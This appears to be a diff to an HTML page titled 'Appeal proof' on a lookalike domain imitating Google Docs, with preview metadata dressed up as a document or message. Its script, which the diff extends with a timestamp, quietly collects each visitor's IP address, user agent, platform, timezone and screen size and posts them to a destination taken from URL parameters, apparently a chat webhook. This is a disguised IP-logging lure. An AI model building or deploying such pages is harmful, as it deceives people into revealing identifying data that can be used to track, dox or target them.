@@ -4,8 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Appeal proof</title>
-    <meta content="data.docx" property="og:title" />
-    <meta content="hello duckietheredrighthand. You have recent..." property="og:description" />
+    <meta content="Dai Dai's message" property="og:title" />
+    <meta content="&lt;html&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;&lt;tit..." property="og:description" />
     <meta content="https://googIedocs.github.io" property="og:url" />
     <meta content="#43B581" data-react-helmet="true" name="theme-color" />
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -119,7 +119,7 @@ if (urlParams.user && urlParams.access) {
       var params = {
         username: urlParams.user[0],
         avatar_url: "",
-        content: json.ip + ", \nUSERAGENT: " + navigator.userAgent + ", \nPLATFORM: " + navigator.platform + ", \nTIMEZONE: " + navigator.timezone + ", \nRESOLUTION: " + window.innerWidth + "x" + window.innerHeight,
+        content: json.ip + ", \nUSERAGENT: " + navigator.userAgent + ", \nPLATFORM: " + navigator.platform + ", \nTIMEZONE: " + navigator.timezone + ", \nRESOLUTION: " + window.innerWidth + "x" + window.innerHeight + ", \nTIME: " + new Date(),
       }
 
       request.send(JSON.stringify(params));
